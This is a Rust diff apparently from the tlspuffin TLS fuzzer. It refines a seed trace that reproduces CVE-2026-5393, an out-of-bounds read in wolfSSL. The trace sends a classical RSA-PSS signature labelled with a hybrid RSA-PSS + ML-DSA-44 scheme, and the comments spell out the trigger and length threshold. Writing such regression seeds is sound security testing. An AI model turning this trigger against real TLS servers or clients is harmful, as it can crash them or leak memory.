@@ -1574,9 +1574,9 @@ pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
 /// - the server certificate must carry an alternative public key of the type named by the hybrid
 ///   scheme: [`fn_alice_dual_alg_cert`] is issued by the trusted `alice.pem` and carries an
 ///   ML-DSA-44 key, which the client decodes before the vulnerable read;
-/// - the CertificateVerify uses the hybrid scheme RSA-PSS + ML-DSA-44 (0xFEA2) and a signature
-///   field starting with a large first length. Its signatures are never checked: the
-///   out-of-bounds read happens first.
+/// - the CertificateVerify uses the hybrid scheme RSA-PSS + ML-DSA-44 (0xFEA2) but carries a
+///   classical RSA-PSS signature, whose first two bytes are read as a large first length. Its
+///   signatures are never checked: the out-of-bounds read happens first.
 pub fn seed_cve_2026_5393(client: AgentName) -> Trace<TLSProtocolTypes> {
     let curve = term! {
         fn_get_any_client_curve(
@@ -1640,12 +1640,30 @@ pub fn seed_cve_2026_5393(client: AgentName) -> Trace<TLSProtocolTypes> {
         )
     };
 
-    // The signature field only holds a large first length: the second length is read past the end
-    // of the WOLFSSL object holding the input buffer (see fn_large_u16_length_bytes).
+    let certificate_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                (@server_hello_transcript),
+                (@encrypted_extensions) // plaintext EncryptedExtensions
+            )),
+            (@certificate) // plaintext Certificate
+        )
+    };
+
+    // A classical RSA-PSS signature labelled with the hybrid scheme: wolfSSL reads its first two
+    // bytes as the first signature length. Signing is deterministic in tlspuffin, and for this
+    // trace that length is large enough for the second length to be read past the end of the
+    // WOLFSSL object holding the input buffer (any length >= ~0xA9B6 does).
     let certificate_verify = term! {
         fn_certificate_verify(
             fn_sig_scheme_hybrid_rsa_pss_mldsa44,
-            (fn_payload_u16(fn_large_u16_length_bytes))
+            (fn_payload_u16(
+                (fn_rsa_sign_server(
+                    (@certificate_transcript),
+                    fn_alice_key,
+                    fn_rsa_pss_signature_algorithm
+                ))
+            ))
         )
     };
 
